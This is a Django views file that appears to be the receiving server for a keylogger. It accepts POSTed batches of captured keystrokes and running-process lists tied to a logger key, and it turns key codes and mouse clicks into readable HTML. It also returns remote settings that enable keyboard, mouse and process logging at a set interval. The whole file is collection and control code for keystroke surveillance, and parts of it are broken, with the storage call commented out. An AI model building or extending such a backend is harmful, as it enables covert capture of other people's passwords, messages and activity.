import json
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
import re
import datetime
import api.models as models


def get_processes(raw_data: str):
    # format: get all processes inside a string that are in the format of "<process_name,...,process_name>...<...>"
    # return a list of all subsets of processes
    array = []
    processes_list = re.findall(r'<(.*?)>', raw_data)
    for processes in processes_list:
        processes = processes.split(',')
        proccesses_obj = {
            'timestamp': processes[0],
            'list': processes[1::],
        }
        array.append(proccesses_obj)
    return array


def translate_key(key: str):
    if key == "RShiftKey" or key == "LShiftKey":
        return "<kbd>Shift</kbd>"
    elif key == "RControlKey" or key == "LControlKey":
        return "<kbd>Ctrl</kbd>"
    elif key == "RMenu" or key == "LMenu":
        return "<kbd>Alt</kbd>"
    elif key == "RWin" or key == "LWin":
        return "<kbd>Win</kbd>"
    elif key == "RAlt" or key == "LAlt":
        return "<kbd>Alt</kbd>"
    elif key == "RShift" or key == "LShift":
        return "<kbd>Shift</kbd>"
    elif key == "RControl" or key == "LControl":
        return "<kbd>Ctrl</kbd>"
    elif key == "RMenu" or key == "LMenu":
        return "<kbd>Alt</kbd>"
    elif key == "Return":
        return "<kbd>Enter</kbd>"
    elif key == "Escape":
        return "<kbd>Esc</kbd>"
    elif key == "Oemplus":
        return "<kbd>+</kbd>"
    elif key == "DML":
        return "<kbd>Double click</kbd>"
    elif key == "ML":
        return "<kbd>Click</kbd>"
    elif key == "MR":
        return "<kbd>Right click</kbd>"
    return "<kbd>{}</kbd>".format(key)


# <span><1></span><kbd>DML</kbd>ASDASD<kbd>Back</kbd>...<kbd>Ctrl</kbd>ZZZZZ
def get_content(raw_data: str):
    # format: string that contains all events logged "asdasdasd<process_name,...>[key]..."
    # return string where all key are replaced with value
    processes_list = re.findall(r'<(.*?)>', raw_data)
    # data_for_strings = raw_data
    cont = 1
    for processes in processes_list:
        raw_data = raw_data.replace("<" + processes + ">", "<span class='processes'>{}</span>".format(cont), 1)
        # data_for_strings = data_for_strings.replace("<" + processes + ">", "$")
        cont += 1
    key_to_replace = re.findall(r'\[(.*?)\]', raw_data)
    for key in key_to_replace:
        raw_data = raw_data.replace("[" + key + "]", translate_key(key), 1)
        # data_for_strings = data_for_strings.replace("[" + key + "]", "$")
    # strings = re.findall(r'([A-Za-z0-9]+)', data_for_strings)
    # sorted(strings,key=len)
    # print(strings)
    # for string in strings:
    #    raw_data = raw_data.replace(string, "<span class='string'>{}</span>".format(string),1)
    #    print("{} -> {}".format(string,raw_data))
    return raw_data


@csrf_exempt
def log(request):
    if request.method != 'POST':
        return HttpResponse(status=404)
    # Request data are in json format
    data = json.load(request)
    key = models.LoggerKey.objects.get(key=data['key'])
    lines = data['content'].split(' $ ')

    for line in lines:
        line = line.split(' | ')
        time, raw_data = line[0], line[1]
        # format timestamp %d/%m/%Y %H:%M:%S to YYYY-MM-DD HH:MM
        timestamp = datetime.datetime.strptime(time, '%d/%m/%Y %H:%M:%S')
        processes = get_processes(raw_data)
        content = get_content(raw_data)
        # models.Event.objects.create(
        #     logger_key=key,
        #     timestamp=timestamp,
        #     content=content,
        #     processes=json.dumps(processes),
        # )
    ### Dynamic settings

    obj = {
        "SECONDS_API_INVOKE":30,
        "LOG_PROCESS_ON_DOUBLE_CLICK":True,
        "LOG_KEYBOARD_EVENTS":True,
        "LOG_MOVE_EVENTS":True,
    }
    key.settings = json.dumps(obj)
    '''
    {
        "SECONDS_API_INVOKE": 30,
        "LOG_PROCESS_ON_DOUBLE_CLICK":"true", // to log process on double click otherwise only on api call
        "LOG_KEYBOARD_EVENTS":"true", // to log keyboard events
        "LOG_MOUSE_EVENTS": "true", // to log mouse events
    }
    {"SECONDS_API_INVOKE": 30,"LOG_PROCESS_ON_DOUBLE_CLICK":"true","LOG_KEYBOARD_EVENTS":"true","LOG_MOUSE_EVENTS": "true"}
    '''
    return JsonResponse(key.settings, safe=False)
